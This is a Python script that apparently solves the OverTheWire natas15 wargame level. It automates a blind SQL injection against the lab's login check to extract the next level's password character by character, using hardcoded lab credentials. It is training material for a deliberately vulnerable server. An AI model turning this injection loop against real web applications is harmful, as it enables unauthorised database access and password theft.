#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Jan 18 10:39:49 2020

@author: Drew
"""

import requests


# the natas passwords to date have included numbers and upper and lower case letters
posschar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# initialise an empty string to hold the successful characters
usedchar = ""

# for each character in the possible characters string
for char1 in posschar:
  
    # form a url that creates a query for natas16" AND password LIKE BINARY "%_%";#
    url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password+LIKE+BINARY+%22%25'+char1+'%25%22%3B%23'
    
    # make the request to the webpage, using the natas15 credentials
    req = requests.get(url, auth=("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"))

    # if the word "exists" is in the text of the response
    if "exists" in req.text:
        # add that character to the used characters string
        usedchar += char1

# display the characters used in the password
print ("Got the characters used in the password")
print (usedchar)

# initialise an empty string to hold the successful password
password = ""

# set the places counter equal to zero 
places = 0

# loop through this process for at most 64 places (we know there are max 64 characters in this field)
while places <= 64:
    
    # increment the places counter by 1
    places += 1

    # for each character in the used characters string
    for char2 in usedchar:
    
        # form a url that creates a query for natas16" AND password LIKE BINARY "_%";# 
        # using the discovered password start and the current character
        url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password+LIKE+BINARY+%22'+password+char2+'%25%22%3B%23'
    
        # make the request to the webpage, using the natas15 credentials
        req = requests.get(url, auth=("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"))

        # get the length of the current password build
        length = len(password)
     
        # if the word "exists" is in the text of the response
        if "exists" in req.text:
           
            # add that character to the used characters string
            password += char2
    
            # display the password as it builds
            print(password)

    # stop running if no characters are added
    if len(password) == length:
        places += 2 

print("The password is: " + password)


    
